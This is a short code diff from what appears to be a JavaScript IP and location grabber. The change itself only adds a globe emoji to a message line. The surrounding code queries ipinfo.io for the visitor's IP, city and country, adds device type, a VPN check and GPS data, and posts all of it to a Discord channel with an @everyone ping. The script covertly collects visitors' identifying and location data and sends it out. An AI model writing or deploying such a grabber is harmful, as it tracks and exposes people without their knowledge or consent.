@@ -24,7 +24,7 @@
             fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\nVPN: ${isVPN()}\n${gpsData}`;
+                const message = `@everyone\n📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})\n🌐 VPN: ${isVPN()}\n${gpsData}`;
 
                 sendToDiscord(message);
             })
